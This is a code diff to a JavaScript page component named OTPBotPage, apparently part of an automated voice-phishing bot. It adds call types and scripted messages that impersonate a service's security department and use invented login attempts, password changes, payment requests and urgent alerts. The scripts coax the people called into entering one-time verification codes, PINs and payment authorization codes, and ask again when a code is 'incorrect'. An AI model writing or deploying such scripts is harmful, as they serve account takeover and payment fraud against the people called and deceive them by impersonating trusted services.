@@ -45,11 +45,66 @@ const VOICE_MODELS = [
 ];
 
 const CALL_TYPES = [
-    { value: 'password_change', label: 'Password Change Alert' },
     { value: 'login_verification', label: 'Login Verification' },
-    { value: 'account_security', label: 'Account Security' },
-    { value: 'transaction_alert', label: 'Transaction Alert' },
+    { value: 'account_recovery', label: 'Account Recovery' },
+    { value: 'service_verification', label: 'Service Verification' },
+    { value: 'pin_request', label: 'PIN Request' },
+    { value: 'password_change', label: 'Password Change' },
+    { value: 'payment_authorize', label: 'Payment Authorization' },
+    { value: 'security_alert', label: 'Security Alert' },
 ];
+
+const CALL_TEMPLATES = {
+    'account_recovery': {
+        step1_message: 'Hello {name}. You have requested recovery for your {service} account. Press 1 to verify your identity and continue the recovery process. Press 0 to discontinue.',
+        step2_message: 'To verify your identity, please enter the {digits} digit verification code that was sent to your registered contact information.',
+        step3_message: 'Please wait while we verify your information.',
+        accepted_message: 'Thank you {name}. Your identity has been verified successfully. Your account recovery process will continue. You will receive further instructions shortly.',
+        rejected_message: 'The verification code is incorrect. Please check the code sent to your device and enter the correct {digits} digit code.'
+    },
+    'login_verification': {
+        step1_message: 'Hello {name}. We have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.',
+        step2_message: 'To Verification, please enter the {digits} digit security code that was just sent to your registered mobile number.',
+        step3_message: 'Thank you. Please hold for a moment while we verify your code.',
+        accepted_message: 'Thank you for waiting. We will get back to you if we need further information. Thank you for your attention, good bye.',
+        rejected_message: 'Thank you for waiting. The verification code you entered previously is incorrect. Please check your device and enter the correct {digits} digit code.'
+    },
+    'service_verification': {
+        step1_message: 'Hello {name}. This is {service}. We need to verify your account information for security purposes. Press 1 to continue the verification process. Press 0 to discontinue.',
+        step2_message: 'Please enter the {digits} digit verification code that we have sent to your registered contact information to confirm your account ownership.',
+        step3_message: 'Please wait while we verify your account.',
+        accepted_message: 'Thank you {name}. Your account has been verified successfully. Your {service} account is now fully secure and updated.',
+        rejected_message: 'The verification code is incorrect. Please enter the correct {digits} digit code that was sent to you.'
+    },
+    'pin_request': {
+        step1_message: 'Hello {name}. This is the {service} security department. We\'ve detected unusual activity on your account. Press 1 to verify your identity with your PIN. Press 0 to refuse to verify your identity.',
+        step2_message: 'For security verification, please enter your {digits} digit PIN number now.',
+        step3_message: 'Please wait while we verify your PIN.',
+        accepted_message: 'Thank you {name}. Your PIN has been verified successfully. Your account is now secure.',
+        rejected_message: 'The PIN number you entered is incorrect. Please carefully enter your correct {digits} digit PIN.'
+    },
+    'password_change': {
+        step1_message: 'Hello {name}, this is the security department from your {service} account. We\'ve received a request to change your account password. If you did not request a password change, press 1 to block this action. If you requested this change, press 0 to confirm.',
+        step2_message: 'Thank you. To secure your account, please enter the {digits}-digit verification code we\'ve just sent to your registered mobile device.',
+        step3_message: 'Please wait while we verify your code.',
+        accepted_message: 'Your code has been verified. Your {service} account will remain protected. Thank you for confirming your security.',
+        rejected_message: 'The verification code is incorrect. Please check the code sent to your device and enter the correct {digits} digit code.'
+    },
+    'payment_authorize': {
+        step1_message: 'Hello {name}. This is {service} contacting you regarding a payment authorization request on your account. Press 1 to review and authorize this transaction. Press 0 to decline this transaction.',
+        step2_message: 'A payment transaction requires your authorization. Please enter the {digits} digit authorization code that was sent to your registered mobile number to approve this transaction.',
+        step3_message: 'Please hold while we process your authorization.',
+        accepted_message: 'Thank you {name}. Your authorization has been confirmed. The transaction will be processed. You will receive a confirmation shortly.',
+        rejected_message: 'The authorization code you entered is invalid. Please enter the correct {digits} digit code to authorize this transaction.'
+    },
+    'security_alert': {
+        step1_message: 'Attention {name}. This is an urgent security alert from {service}. We\'ve detected suspicious activity on your account. Press 1 immediately to verify your identity and secure your account. Press 0 to cancel identity verification.',
+        step2_message: 'To confirm your identity and secure your account, please enter the {digits} digit emergency security code that was sent to your registered number.',
+        step3_message: 'Please hold while we verify your security code.',
+        accepted_message: 'Thank you {name}. Your identity has been confirmed. We are taking immediate action to secure your account. You will receive a detailed security report shortly.',
+        rejected_message: 'The security code is incorrect. This is urgent. Please enter the correct {digits} digit code to secure your account.'
+    }
+};
 
 const OTPBotPage = () => {
     const [socket, setSocket] = useState(null);
